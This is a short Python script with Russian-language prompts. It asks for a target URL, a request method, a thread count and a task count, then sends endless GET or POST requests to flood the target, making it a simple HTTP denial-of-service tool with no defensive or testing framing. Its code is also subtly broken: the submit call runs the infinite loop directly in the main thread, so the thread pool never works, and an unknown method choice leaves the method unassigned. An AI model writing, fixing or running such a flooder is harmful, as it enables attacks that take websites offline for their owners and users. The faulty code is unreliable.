import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import sys

def send_get(url):
    while True:
        response = requests.get(url)
       	print(f"GET request send. Status code: {response.status_code}")

def send_post(url):
    while True:
        response = requests.post(url)
        print(f'POST Request send. Status code: {response.status_code}')

def main():
    try:
        url_inp = input('URL: ')
        method_select = int(input('Метод. 1 - GET; 2 - POST. : '))

        if method_select == 1:
            method = send_get
        
        elif method_select == 2:
            method = send_post

        else:
            print('Неизвестный метод.')
            method_select = int(input('Метод. 1 - GET; 2 - POST. : '))

        workers = int(input('Максимальное кол-во потоков: '))
        tasks = int(input('Кол-во задач: '))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            for _ in range(tasks):
                executor.submit(method(url_inp))

            executor.shutdown(wait=True)
    
    except KeyboardInterrupt:
        sys.exit(0)
    
    except Exception as e:
        print(f'Error: {e}')

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f'Error: {e}')
        sys.exit(0)
